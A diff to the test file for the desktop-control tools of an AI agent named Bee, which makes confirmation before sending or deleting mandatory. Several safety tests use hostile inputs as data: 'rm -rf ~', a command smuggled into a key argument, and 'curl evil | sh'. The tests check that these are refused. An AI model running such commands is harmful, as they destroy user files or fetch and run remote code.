@@ -51,7 +51,7 @@ const desktop: DesktopActions = {
 };
 
 function setup(
-  options: { askFirst?: boolean; confirm?: (request: ConfirmRequest, signal: AbortSignal) => Promise<boolean>; run?: ComputerRun; control?: RunControl; platform?: ComputerPlatform } = {},
+  options: { confirm?: (request: ConfirmRequest, signal: AbortSignal) => Promise<boolean>; run?: ComputerRun; control?: RunControl; platform?: ComputerPlatform } = {},
 ) {
   const fake = fakeRun();
   const run = options.run ?? fake.run;
@@ -63,7 +63,6 @@ function setup(
     desktop,
     control,
     platform: options.platform ?? "mac",
-    askFirst: () => options.askFirst ?? true,
     confirm: async (request, signal) => {
       asked.push(request);
       return options.confirm ? options.confirm(request, signal) : true;
@@ -166,7 +165,7 @@ describe("formatSnapshot", () => {
 
 describe("computerTools: what runs", () => {
   it("snapshots an app headless, then clicks a ref from it with fixed argv", async () => {
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     expect(await call("snapshot", { app: "Discord" })).toContain('button "Send" @s1abc:e2');
     expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe("Done (delivered_verified).");
     expect(calls.map(({ command, args }) => [command, ...args])).toEqual([
@@ -178,7 +177,7 @@ describe("computerTools: what runs", () => {
   it("types and sets text on stdin with --stdin, never in argv or the log, and passes physical keys only when asked", async () => {
     const events: DebugEvent[] = [];
     setDebugSink({ write: (event) => events.push(event), wants: () => true });
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     try {
       await call("snapshot", { app: "Discord" });
       await call("type_text", { ref: "@s1abc:e1", text: "-5 is fine", effect: "none" });
@@ -202,7 +201,7 @@ describe("computerTools: what runs", () => {
   });
 
   it("waits on a ref's predicate with fixed argv, and refuses a bad mix before anything runs", async () => {
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     await call("snapshot", { app: "Discord" });
     expect(await call("wait", { element: "@s1abc:e1", predicate: "value", value: "draft" })).toBe("Done.");
     expect(await call("wait", { element: "@s1abc:e1", predicate: "actionable", action: "type", timeout_ms: 3000 })).toBe("Done.");
@@ -222,7 +221,7 @@ describe("computerTools: what runs", () => {
   });
 
   it("reads a field's value and any other element's text by default", async () => {
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     await call("snapshot", { app: "Discord" });
     await call("read", { ref: "@s1abc:e1" });
     await call("read", { ref: "@s1abc:e2" });
@@ -233,7 +232,7 @@ describe("computerTools: what runs", () => {
   });
 
   it("presses keys in a named app only, and closes apps but never Finder, Explorer or Bee", async () => {
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     expect(await call("press_key", { keys: "Cmd + W", app: "Google Chrome", effect: "none" })).toMatch(/^Done/);
     expect(await call("press_key", { keys: "cmd+w; rm -rf ~", app: "Google Chrome", effect: "none" })).toMatch(/^Error/);
     expect(await call("close_app", { name: "Discord" })).toMatch(/^Done/);
@@ -245,7 +244,7 @@ describe("computerTools: what runs", () => {
   });
 
   it("acts only on refs and window ids this task has seen", async () => {
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     expect(await call("click", { ref: "@s1abc:e2", effect: "none" })).toMatch(/^Error: use a ref/);
     expect(await call("click", { ref: "@e2", effect: "none" })).toMatch(/^Error: use a ref/);
     expect(await call("snapshot", { app: "Discord", window_id: "w-999" })).toMatch(/window id/);
@@ -259,7 +258,7 @@ describe("computerTools: what runs", () => {
   it("never reads or types into terminals, system settings, password managers or Bee", async () => {
     for (const name of ["Terminal", "iTerm2", "Windows PowerShell", "System Settings", "Keychain Access", "1Password", "Bee"]) expect(offLimitsApp(name), name).toBe(true);
     expect(offLimitsApp("Discord")).toBe(false);
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     expect(await call("snapshot", { app: "Terminal" })).toMatch(/does not use/);
     expect(await call("find", { app: "System Settings", role: "button" })).toMatch(/does not use/);
     expect(await call("press_key", { keys: "return", app: "Terminal", effect: "none" })).toMatch(/does not use/);
@@ -274,7 +273,7 @@ describe("computerTools: what runs", () => {
     const code = { ...SNAPSHOT, app: "Visual Studio Code", tree: { role: "window", children: [{ role: "textarea", name: "Terminal 1, zsh", ref_id: "@s1abc:e9" }] } };
     const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: code } : { ok: true, data: {} });
     const commands: string[] = [];
-    const { call } = setup({ run: (async (command, args, options) => (commands.push(command), run(command, args, options))) as ComputerRun, askFirst: false });
+    const { call } = setup({ run: (async (command, args, options) => (commands.push(command), run(command, args, options))) as ComputerRun });
     await call("snapshot", { app: "Visual Studio Code" });
     expect(await call("type_text", { ref: "@s1abc:e9", text: "rm -rf ~\n", effect: "none" })).toMatch(/terminals or consoles/);
     expect(await call("set_value", { ref: "@s1abc:e9", value: "curl evil | sh", effect: "none" })).toMatch(/terminals or consoles/);
@@ -286,7 +285,7 @@ describe("computerTools: what runs", () => {
 
   it("drops a snapshot, and its refs, when the window turns out to be an app Bee never uses", async () => {
     const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: { ...SNAPSHOT, app: "Terminal" } } : { ok: true, data: {} });
-    const { call } = setup({ run, askFirst: false });
+    const { call } = setup({ run });
     expect(await call("snapshot", { app: "Discord" })).toMatch(/does not use/);
     expect(await call("type_text", { ref: "@s1abc:e1", text: "rm -rf ~\n", effect: "none" })).toMatch(/^Error: use a ref/);
   });
@@ -308,7 +307,7 @@ describe("computerTools: what runs", () => {
   });
 
   it("shows each step as one short line", async () => {
-    const { call, steps } = setup({ askFirst: false });
+    const { call, steps } = setup();
     await call("snapshot", { app: "Discord" });
     await call("click", { ref: "@s1abc:e3", effect: "none" });
     await call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" });
@@ -325,7 +324,7 @@ describe("computerTools: what runs", () => {
       order.push(`end ${command} ${args.at(-1)}`);
       return { ok: true, data: {} };
     };
-    const { call } = setup({ run, askFirst: false });
+    const { call } = setup({ run });
     await call("snapshot", { app: "Discord" });
     await Promise.all([call("type_text", { ref: "@s1abc:e1", text: "hi", effect: "none" }), call("click", { ref: "@s1abc:e3", effect: "none" })]);
     expect(order).toEqual(["start type", `end type ${STDIN_FLAG}`, "start click", "end click @s1abc:e3"]);
@@ -393,14 +392,6 @@ describe("computerTools: ask before sending or deleting", () => {
     expect(asked.map((request) => [request.kind, request.detail])).toEqual([["send", "Press Return in “Message @sam”"]]);
     await call("click", { ref: "@s1abc:e3", effect: "delete" });
     expect(asked.map((request) => request.kind)).toEqual(["send", "delete"]);
-  });
-
-  it("runs on its own with the setting off", async () => {
-    const { call, calls, asked } = setup({ askFirst: false });
-    await call("snapshot", { app: "Discord" });
-    expect(await call("click", { ref: "@s1abc:e2", effect: "send" })).toMatch(/^Done/);
-    expect(asked).toEqual([]);
-    expect(calls.map((item) => item.command)).toEqual(["snapshot", "click"]);
   });
 
   it("reads Stop while waiting as Cancel, and does not count the wait against the clock", async () => {
@@ -534,15 +525,6 @@ describe("computerTools: the confirm gate reads the tree, not the AI", () => {
     expect(asked).toHaveLength(1);
   });
 
-  it("still runs on its own with the setting off", async () => {
-    const { run, commands } = discordRun();
-    const { call, asked } = setup({ run, askFirst: false });
-    await call("snapshot", { app: "Discord" });
-    expect(await call("click", { ref: "@s3:e9", effect: "none" })).toMatch(/^Done/);
-    expect(await call("click", { ref: "@s3:e4", effect: "none" })).toMatch(/^Done/);
-    expect(asked).toEqual([]);
-    expect(commands.map((item) => item.command)).toEqual(["snapshot", "click", "click"]);
-  });
 });
 
 describe("formatSnapshot and formatMatches: odd nodes", () => {
@@ -650,7 +632,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
 
   it("reads again once, in a new process with more time and depth, when a read fails where a retry is safe", async () => {
     const { run, calls } = timedRun(() => INTERNAL);
-    const { call, steps } = setup({ run, askFirst: false });
+    const { call, steps } = setup({ run });
     const line = await call("snapshot", { app: "Microsoft Teams" });
     expect(line).toMatch(/^Error INTERNAL: .*Detail: Accessibility deadline exhausted before IPC$/);
     expect(calls.map(({ args, timeoutMs }) => [args.slice(2).join(" "), timeoutMs])).toEqual([
@@ -662,7 +644,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
 
   it("returns the second read when it works", async () => {
     const { run, calls } = timedRun((_call, index) => (index === 0 ? INTERNAL : { ok: true, data: tree(6) }));
-    const { call } = setup({ run, askFirst: false });
+    const { call } = setup({ run });
     expect(await call("snapshot", { app: "Microsoft Teams", skeleton: true })).toContain('button "Item 5" @s7:e5');
     // A skeleton is shallow by design: the second read is longer, not deeper.
     expect(calls.map(({ args }) => args.at(-2))).toEqual(["--skeleton", "--skeleton"]);
@@ -671,24 +653,24 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
   it("does not read again when agent-desktop does not call a retry safe, or for an error a retry cannot fix", async () => {
     for (const failure of [{ ok: false, code: "INTERNAL", message: "x" }, { ok: false, code: "INTERNAL", retry: "unsafe" }, { ok: false, code: "APP_NOT_FOUND", retry: "safe" }] as AgentDesktopResult[]) {
       const { run, calls } = timedRun(() => failure);
-      const { call } = setup({ run, askFirst: false });
+      const { call } = setup({ run });
       await call("snapshot", { app: "Microsoft Teams" });
       // APP_NOT_FOUND asks list-apps for the app's real name, but never reads the same name twice.
       expect(calls.filter(({ command }) => command === "snapshot"), JSON.stringify(failure)).toHaveLength(1);
     }
     // A renderer that is still waking up reads again, whatever the code.
     const { run, calls } = timedRun(() => ({ ok: false, code: "ACTION_FAILED", retry: "safe", kind: "renderer_accessibility_activation_required" }));
-    await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
+    await setup({ run }).call("snapshot", { app: "Microsoft Teams" });
     expect(calls).toHaveLength(2);
   });
 
   it("reads a thin window again and keeps the better read; a thin read beats a failed one", async () => {
     const better = timedRun((_call, index) => ({ ok: true, data: index === 0 ? tree(2) : tree(30) }));
-    const shown = await setup({ run: better.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
+    const shown = await setup({ run: better.run }).call("snapshot", { app: "Microsoft Teams" });
     expect(shown).toContain('button "Item 29" @s7:e29');
     expect(shown).not.toMatch(/Few elements/);
     const failed = timedRun((_call, index) => (index === 0 ? { ok: true, data: tree(2) } : INTERNAL));
-    const thin = await setup({ run: failed.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
+    const thin = await setup({ run: failed.run }).call("snapshot", { app: "Microsoft Teams" });
     expect(thin).toContain('button "Item 1" @s7:e1');
     // Bee already waited: the AI tries the tree another way, then stops.
     expect(thin).toMatch(/Few elements came back, though Bee gave the app time to load\. Try find by role .* or a skeleton snapshot then root\. If those show nothing usable either, stop and say Bee cannot control this app\./);
@@ -701,7 +683,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
     expect(thinTree(tree(2))).toBe(true);
     expect(thinTree({ ref_count: 40, tree: {} })).toBe(false);
     const { run, calls } = timedRun(() => ({ ok: true, data: tree(30, { complete: false }) }));
-    expect(await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/partial: raise detail with root/);
+    expect(await setup({ run }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/partial: raise detail with root/);
     expect(calls).toHaveLength(1);
   });
 
@@ -711,7 +693,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
       if (args.some((arg) => arg.startsWith("--root="))) return index === 2 ? { ok: false, code: "TIMEOUT", retry: "safe" } : { ok: true, data: tree(1) };
       return { ok: true, data: tree(8) };
     });
-    const { call } = setup({ run, askFirst: false });
+    const { call } = setup({ run });
     await call("snapshot", { app: "Microsoft Teams" });
     await call("snapshot", { app: "Microsoft Teams", surface: "menu" });
     await call("snapshot", { root: "@s7:e1" });
@@ -725,7 +707,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
 
   it("gives find a budget, and reads again once when that fails where a retry is safe", async () => {
     const { run, calls } = timedRun((_call, index) => (index === 0 ? { ok: false, code: "TIMEOUT", retry: "safe" } : { ok: true, data: { matches: [{ role: "textfield", name: "Type a message", ref_id: "@s8:e1" }] } }));
-    const { call } = setup({ run, askFirst: false });
+    const { call } = setup({ run });
     expect(await call("find", { app: "Microsoft Teams", role: "textfield" })).toBe('textfield "Type a message" @s8:e1');
     expect(calls.map(({ args, timeoutMs }) => [args.at(-1), timeoutMs])).toEqual([
       ["--timeout-ms=12000", 18_000],
@@ -735,7 +717,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
 
   it("reads a ref once more after a safe INTERNAL, and says a slow read is slow, not that something happened", async () => {
     const { run, calls } = timedRun(({ command }) => (command === "snapshot" ? { ok: true, data: SNAPSHOT } : { ok: false, code: "TIMEOUT", retry: "safe" }));
-    const { call } = setup({ run, askFirst: false });
+    const { call } = setup({ run });
     await call("snapshot", { app: "Discord" });
     expect(await call("read", { ref: "@s1abc:e1" })).toMatch(/did not finish in time/);
     expect(calls.map(({ command }) => command)).toEqual(["snapshot", "get", "get"]);
@@ -745,7 +727,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
     const run: ComputerRun = async () => {
       throw new Error("agent-desktop flag value not allowed: --app");
     };
-    expect(await setup({ run, askFirst: false }).call("list_apps", {})).toMatch(/^Error REFUSED: Bee does not run that/);
+    expect(await setup({ run }).call("list_apps", {})).toMatch(/^Error REFUSED: Bee does not run that/);
   });
 
   it("logs agent-desktop's code and redacted message for every failed command", async () => {
@@ -753,7 +735,7 @@ describe("computerTools: a slow or failing tree (a Chromium or WebView2 app such
     setDebugSink({ write: (event) => events.push(event), wants: () => true });
     try {
       const { run } = timedRun(() => INTERNAL);
-      await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
+      await setup({ run }).call("snapshot", { app: "Microsoft Teams" });
     } finally {
       setDebugSink(null);
     }
@@ -795,7 +777,7 @@ describe("computerTools: agent-desktop 1.1 snapshots and refs", () => {
   const DEEP = [...CUT.slice(0, 2), { role: "textfield", name: "Type a message", ref_id: "@s7:e9" }, { role: "button", name: "Send", ref_id: "@s7:e10" }];
 
   it("keeps the tool surface small: read checks states, an empty set_value clears, set_state ticks and expands, scroll without a direction brings a ref into view", async () => {
-    const { call, calls, tools, steps } = setup({ askFirst: false });
+    const { call, calls, tools, steps } = setup();
     expect(Object.keys(tools).sort()).toEqual([...COMPUTER_TOOL_NAMES].sort());
     expect(COMPUTER_TOOL_NAMES).toHaveLength(19);
     await call("snapshot", { app: "Discord" });
@@ -837,7 +819,7 @@ describe("computerTools: agent-desktop 1.1 snapshots and refs", () => {
 
   it("reads a Windows window again with more time when it could not prove its refs, and keeps the proven read", async () => {
     const { run, calls } = recorded(({ command }, index) => (command === "snapshot" ? { ok: true, data: teams(buttons(index === 0 ? 30 : 12), index === 0 ? { identity_unproven: true } : {}) } : DONE));
-    const { call, steps } = setup({ run, askFirst: false, platform: "windows" });
+    const { call, steps } = setup({ run, platform: "windows" });
     const shown = await call("snapshot", { app: "Microsoft Teams" });
     expect(calls.map(({ args, timeoutMs }) => [args.slice(2).join(" "), timeoutMs])).toEqual([
       ["--app=Microsoft Teams --timeout-ms=12000", 18_000],
@@ -852,13 +834,13 @@ describe("computerTools: agent-desktop 1.1 snapshots and refs", () => {
 
   it("says so when a Windows window still cannot prove its refs, and never reads again for that on a Mac", async () => {
     const still = recorded(() => ({ ok: true, data: teams(buttons(30), { identity_unproven: true }) }));
-    expect(await setup({ run: still.run, askFirst: false, platform: "windows" }).call("snapshot", { app: "Microsoft Teams" })).toMatch(
+    expect(await setup({ run: still.run, platform: "windows" }).call("snapshot", { app: "Microsoft Teams" })).toMatch(
       /could not read the whole window in time, so some refs may be refused \(AMBIGUOUS_TARGET\)/,
     );
     expect(still.calls).toHaveLength(2);
     // A Mac ref carries its element's own address, so it acts without that proof.
     const mac = recorded(() => ({ ok: true, data: teams(buttons(30), { identity_unproven: true }) }));
-    expect(await setup({ run: mac.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).not.toMatch(/refused/);
+    expect(await setup({ run: mac.run }).call("snapshot", { app: "Microsoft Teams" })).not.toMatch(/refused/);
     expect(mac.calls).toHaveLength(1);
   });
 
@@ -867,23 +849,23 @@ describe("computerTools: agent-desktop 1.1 snapshots and refs", () => {
     expect(shallowTree(teams(DEEP))).toBe(false);
     expect(shallowTree(SNAPSHOT)).toBe(false);
     const { run, calls } = recorded(({ args }) => ({ ok: true, data: teams(args.some((arg) => arg.startsWith("--max-depth=")) ? DEEP : CUT) }));
-    const shown = await setup({ run, askFirst: false, platform: "windows" }).call("snapshot", { app: "Microsoft Teams" });
+    const shown = await setup({ run, platform: "windows" }).call("snapshot", { app: "Microsoft Teams" });
     expect(calls.map(({ args }) => args.slice(2).join(" "))).toEqual(["--app=Microsoft Teams --timeout-ms=12000", "--app=Microsoft Teams --max-depth=25 --timeout-ms=25000"]);
     // Fewer refs than the cut read, but these are the controls.
     expect(shown).toContain('textfield "Type a message" @s7:e9');
     expect(shown).not.toMatch(/sit deeper/);
     const skeleton = recorded(() => ({ ok: true, data: teams(CUT) }));
-    expect(await setup({ run: skeleton.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams", skeleton: true })).not.toMatch(/sit deeper/);
+    expect(await setup({ run: skeleton.run }).call("snapshot", { app: "Microsoft Teams", skeleton: true })).not.toMatch(/sit deeper/);
     expect(skeleton.calls).toHaveLength(1);
     // Still cut off after the deeper read: the AI drills one region, and stops if that shows nothing either.
     const stuck = recorded(() => ({ ok: true, data: teams(CUT) }));
-    expect(await setup({ run: stuck.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/The controls sit deeper than this read: snapshot one region marked inside with root/);
+    expect(await setup({ run: stuck.run }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/The controls sit deeper than this read: snapshot one region marked inside with root/);
     expect(stuck.calls).toHaveLength(2);
   });
 
   it("never reads again when agent-desktop says waiting cannot help", async () => {
     const { run, calls } = recorded(() => ({ ok: false, code: "INTERNAL", retry: "safe", retryable: false }));
-    expect(await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/Waiting will not help: try another way\.$/);
+    expect(await setup({ run }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/Waiting will not help: try another way\.$/);
     expect(calls).toHaveLength(1);
   });
 
@@ -907,7 +889,7 @@ describe("computerTools: agent-desktop 1.1 snapshots and refs", () => {
   it("acts once more by itself only when agent-desktop could not check the element in time and sent nothing", async () => {
     const unknown: AgentDesktopResult = { ok: false, code: "TIMEOUT", kind: "resolution_identity_unknown", retry: "safe" };
     const { run, calls } = recorded(({ command }, index) => (command === "snapshot" ? { ok: true, data: SNAPSHOT } : index === 1 ? unknown : DONE));
-    const { call, control } = setup({ run, askFirst: false });
+    const { call, control } = setup({ run });
     await call("snapshot", { app: "Discord" });
     expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe("Done (delivered_verified).");
     expect(calls.map(({ command }) => command)).toEqual(["snapshot", "click", "click"]);
@@ -916,7 +898,7 @@ describe("computerTools: agent-desktop 1.1 snapshots and refs", () => {
     // Anything that may have landed, or that agent-desktop does not call safe, is never repeated.
     for (const failure of [{ ...unknown, retry: "unsafe" }, { ok: false, code: "TIMEOUT", retry: "safe", kind: "actionability_timeout" }, { ok: false, code: "ACTION_FAILED", retry: "unsafe" }] as AgentDesktopResult[]) {
       const once = recorded(({ command }) => (command === "snapshot" ? { ok: true, data: SNAPSHOT } : failure));
-      const tools = setup({ run: once.run, askFirst: false });
+      const tools = setup({ run: once.run });
       await tools.call("snapshot", { app: "Discord" });
       await tools.call("click", { ref: "@s1abc:e3", effect: "none" });
       expect(once.calls.filter(({ command }) => command === "click"), JSON.stringify(failure)).toHaveLength(1);
@@ -969,7 +951,7 @@ describe("computerTools: the tree is the only way in", () => {
 
   it("says plainly that Bee cannot control an app whose tree stays empty once Bee has waited, and never offers a picture", async () => {
     const { run, calls } = recorded(({ command }) => (command === "snapshot" ? { ok: true, data: teams([]) } : { ok: true, data: { matches: [] } }));
-    const { call } = setup({ run, askFirst: false });
+    const { call } = setup({ run });
     for (const input of [{ app: TEAMS }, { app: TEAMS, skeleton: true }]) {
       const shown = await call("snapshot", input);
       expect(shown, JSON.stringify(input)).toContain(`If those show nothing usable either, ${CANNOT_CONTROL}.`);
@@ -990,12 +972,12 @@ describe("computerTools: the tree is the only way in", () => {
       { role: "group", ref_id: "@s7:e5", children_count: 8 },
     ];
     const shallow = recorded(() => ({ ok: true, data: teams(cut) }));
-    const deep = await setup({ run: shallow.run, askFirst: false }).call("snapshot", { app: TEAMS });
+    const deep = await setup({ run: shallow.run }).call("snapshot", { app: TEAMS });
     expect(deep).toContain(`If those show no usable controls, ${CANNOT_CONTROL}.`);
     expect(deep).not.toMatch(PICTURE);
     const buttons = Array.from({ length: 30 }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s7:e${index}` }));
     const unproven = recorded(() => ({ ok: true, data: teams(buttons, { identity_unproven: true }) }));
-    const refused = await setup({ run: unproven.run, askFirst: false, platform: "windows" }).call("snapshot", { app: TEAMS });
+    const refused = await setup({ run: unproven.run, platform: "windows" }).call("snapshot", { app: TEAMS });
     expect(refused).toContain(`If they keep being refused, ${CANNOT_CONTROL}.`);
     expect(refused).not.toMatch(PICTURE);
   });
@@ -1078,7 +1060,7 @@ describe("computerTools: Teams on Windows (app names, focus for keys, ambiguous 
       if (args.includes("--app=ms-teams.exe")) return command === "snapshot" ? { ok: true, data: window("s7", controls("s7")) } : { ok: true, data: { matches: [] } };
       return { ok: false, code: "APP_NOT_FOUND", message: "Application '…' was not found with exact process identity", retry: "safe" };
     });
-    const { call } = setup({ run, askFirst: false, platform: "windows" });
+    const { call } = setup({ run, platform: "windows" });
     const shown = String(await call("snapshot", { app: "Teams", skeleton: true }));
     expect(shown).toMatch(/^Using ms-teams\.exe for Teams\.\s/);
     expect(shown).toContain('combobox "Search (Ctrl+E)" @s7:e1');
@@ -1095,7 +1077,7 @@ describe("computerTools: Teams on Windows (app names, focus for keys, ambiguous 
     for (const { args } of calls) expect(args.join(" ")).not.toContain("…");
     // An app list_apps showed is matched before anything runs.
     const listed = recorded(({ command }) => (command === "list-apps" ? APPS : DONE));
-    const tools = setup({ run: listed.run, askFirst: false, platform: "windows" });
+    const tools = setup({ run: listed.run, platform: "windows" });
     await tools.call("list_apps", {});
     expect(await tools.call("list_windows", { app: "Chrome" })).toMatch(/^Using chrome\.exe for Chrome\. No windows\./);
     expect(lines(listed.calls)).toEqual(["list-apps", "list-windows --app=chrome.exe"]);
@@ -1109,7 +1091,7 @@ describe("computerTools: Teams on Windows (app names, focus for keys, ambiguous 
       if (command === "press") return (presses += 1) === 1 ? noFocus : DONE;
       return DONE;
     });
-    const { call } = setup({ run, askFirst: false, platform: "windows" });
+    const { call } = setup({ run, platform: "windows" });
     await call("snapshot", { app: "ms-teams.exe" });
     await call("set_value", { ref: "@s7:e1", value: "Zuzanna", effect: "none" });
     expect(await call("press_key", { keys: "return", app: "ms-teams.exe", effect: "none" })).toMatch(/^Done/);
@@ -1122,14 +1104,14 @@ describe("computerTools: Teams on Windows (app names, focus for keys, ambiguous 
     const refused = recorded(({ command }) =>
       command === "snapshot" ? { ok: true, data: window("s7", controls("s7")) } : command === "press" ? noFocus : command === "focus" ? { ok: false, code: "POLICY_DENIED", retry: "safe" } : DONE,
     );
-    const tools = setup({ run: refused.run, askFirst: false, platform: "windows" });
+    const tools = setup({ run: refused.run, platform: "windows" });
     await tools.call("snapshot", { app: "ms-teams.exe" });
     await tools.call("set_value", { ref: "@s7:e1", value: "Zuzanna", effect: "none" });
     expect(await tools.call("press_key", { keys: "return", app: "ms-teams.exe", effect: "none" })).toMatch(/^Bee tried to focus the field first: Error POLICY_DENIED.*Error ACTION_FAILED/);
     expect(refused.calls.filter(({ command }) => command === "press")).toHaveLength(1);
     // No field written this run: nothing to focus.
     const none = recorded(({ command }) => (command === "press" ? noFocus : DONE));
-    await setup({ run: none.run, askFirst: false, platform: "windows" }).call("press_key", { keys: "return", app: "ms-teams.exe", effect: "none" });
+    await setup({ run: none.run, platform: "windows" }).call("press_key", { keys: "return", app: "ms-teams.exe", effect: "none" });
     expect(lines(none.calls)).toEqual(["press return --app=ms-teams.exe"]);
   });
 
@@ -1169,7 +1151,7 @@ describe("computerTools: Teams on Windows (app names, focus for keys, ambiguous 
       if (command === "snapshot" && args.some((arg) => arg.startsWith("--root="))) return ambiguous;
       return { ok: true, data: (reads += 1) === 1 ? window("s7", controls("s7")) : window("s8", controls("s8", twins)) };
     });
-    const { call } = setup({ run, askFirst: false, platform: "windows" });
+    const { call } = setup({ run, platform: "windows" });
     await call("snapshot", { app: "ms-teams.exe" });
     const shown = String(await call("snapshot", { root: "@s7:e33" }));
     expect(shown).toMatch(/^@s7:e33 could not be told apart from another element, so Bee read the whole window again\. Use its refs\.\n/);
@@ -1187,7 +1169,7 @@ describe("computerTools: Teams on Windows (app names, focus for keys, ambiguous 
     expect(findRole("widgetthing", new Set(["switch"]))).toEqual({ error: expect.stringMatching(/no widgetthing role\. Roles seen here: switch\. Roles: alert, .*treeitem/) });
     expect(findRole("a+b")).toEqual({ error: "Error: role is one word, for example button." });
     const { run, calls } = recorded(({ command }) => (command === "snapshot" ? { ok: true, data: window("s7", controls("s7")) } : { ok: true, data: { matches: [], roles_present: ["button", "combobox", "listbox"] } }));
-    const { call } = setup({ run, askFirst: false, platform: "windows" });
+    const { call } = setup({ run, platform: "windows" });
     expect(await call("find", { app: "ms-teams.exe", role: "listitem" })).toMatch(/^Error: agent-desktop has no listitem role/);
     expect(await call("find", { app: "ms-teams.exe", role: "blah" })).toMatch(/^Error: agent-desktop has no blah role/);
     expect(calls).toEqual([]);
@@ -1204,7 +1186,7 @@ describe("computerTools: act runs a short batch in one step", () => {
   const enter = { do: "press_key", keys: "return", app: "Discord", ref: "@s1abc:e1", effect: "send" } as const;
 
   it("runs each action in order, as one step of the budget, and says how each went", async () => {
-    const { call, calls, control, steps } = setup({ askFirst: false });
+    const { call, calls, control, steps } = setup();
     await call("snapshot", { app: "Discord" });
     const output = String(await call("act", { actions: [{ do: "click", ref: "@s1abc:e1", effect: "none" }, fill, enter] }));
     expect(calls.slice(1).map(({ command, args }) => [command, ...args])).toEqual([
@@ -1220,12 +1202,13 @@ describe("computerTools: act runs a short batch in one step", () => {
       "2. set_value: Done (delivered_verified).",
       "3. press_key: Done (delivered_verified). Check the result with a snapshot.",
     ]);
-    expect(steps.slice(1)).toEqual(["Clicking Message @sam…", "Typing in Message @sam…", "Pressing Return…"]);
+    // Return in the message box sends, so it waits for the Confirm (answered yes) first.
+    expect(steps.slice(1)).toEqual(["Clicking Message @sam…", "Typing in Message @sam…", "Pressing Return…", "Waiting for you to confirm…", "Pressing Return…"]);
   });
 
   it("stops at the first action that fails, and runs nothing after it", async () => {
     const fake = fakeRun((call) => (call.command === "set-value" ? { ok: false, code: "ACTION_FAILED", retry: "unsafe" } : { ok: true, data: {} }));
-    const { call } = setup({ askFirst: false, run: fake.run });
+    const { call } = setup({ run: fake.run });
     await call("snapshot", { app: "Discord" });
     const output = String(await call("act", { actions: [fill, enter, send] }));
     expect(fake.calls.map((item) => item.command)).toEqual(["snapshot", "set-value"]);
@@ -1234,7 +1217,7 @@ describe("computerTools: act runs a short batch in one step", () => {
   });
 
   it("stops on a ref it has not seen, an app Bee never uses, or a terminal, before running anything there", async () => {
-    const { call, calls } = setup({ askFirst: false });
+    const { call, calls } = setup();
     await call("snapshot", { app: "Discord" });
     expect(String(await call("act", { actions: [{ do: "click", ref: "@s9:e9", effect: "none" }, fill] }))).toContain("1. click: Error: use a ref from this task's latest snapshot");
     expect(String(await call("act", { actions: [{ ...enter, app: "Keychain" }, fill] }))).toContain("Bee does not use terminals");
@@ -1254,7 +1237,7 @@ describe("computerTools: act runs a short batch in one step", () => {
 
   it("does nothing once the budget is spent, and holds at most ACT_MAX actions", async () => {
     const control = createRunControl({ maxSteps: 1 });
-    const { call, calls, tools } = setup({ askFirst: false, control });
+    const { call, calls, tools } = setup({ control });
     await call("snapshot", { app: "Discord" });
     expect(await call("act", { actions: [fill] })).toBe(STOPPED);
     expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
